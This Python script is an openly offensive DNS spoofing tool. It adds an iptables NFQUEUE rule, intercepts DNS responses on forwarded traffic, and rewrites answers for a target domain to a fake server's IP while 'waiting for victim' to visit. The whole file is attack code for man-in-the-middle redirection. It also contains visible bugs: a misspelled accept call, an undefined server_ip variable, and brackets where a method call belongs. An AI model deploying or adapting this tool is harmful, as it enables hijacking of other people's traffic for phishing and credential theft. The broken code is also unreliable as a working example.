#!/usr/bin/env python
# -*- coding: utf-8 -*-

import netfilterqueue
from colorama import Fore
import sys, os
import optparse
import scapy.all as scapy

iptables = os.system('iptables -I FORWARD -j NFQUEUE --queue-num 0')

def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target", help="Target URL.")
    parser.add_option("-i", "--ip", dest="server_ip", help="IP address of the Fake Server.")
    (options, arguments) = parser.parse_args()
    if not options.target:
        parser.error("[-] Please Specify a Target URL, use --help for more info.")
    elif not options.server_ip:
        parser.error("[-] Please Specify a Source IP, use --help for more info.")
    return options

def process_packet(packet):
     try:
          scapy_packet = scapy.IP(packet.get_payload())
          if scapy_packet.haslayer[scapy.DNSRR]:
               qname=scapy_packet[scapy.DNSQR].qname
               if options.target in qname:
                    print("[+] Spoofing " + options.target)
                    answer = scapy.DNSRR(rrname=qname, rdata=str(server_ip))
                    scapy_packet[scapy.DNS].an = answer
                    scapy_packet[scapy.DNS].ancount = 1
                    
                    del scapy_packet[scapy.IP].len
                    del scapy_packet[scapy.IP].chksum
                    del scapy_packet[scapy.UDP].chksum
                    del scapy_packet[scapy.UDP].len
                    
                    packet.set_payload(str(scapy_packet))
                     
          packet.accpet()
               
     except KeyboardInterrupt:
          print("[+] Resetting IPTables")
          os.system('iptables --flush')
          print("[*] Quit")

def nfqueue():
     try:
          queue = netfilterqueue.NetfilterQueue()
          iptables
          queue.bind(0, process_packet)
          print(Fore.RED+"[*] RUNNING")
          print(Fore.GREEN+"waiting for victim to visit " + options.target)
          return queue.run()
     except KeyboardInterrupt:
          print("[+] Resetting IPTables")
          os.system('iptables --flush')
          print("[*] Quit")

options = get_arguments()
nfqueue()





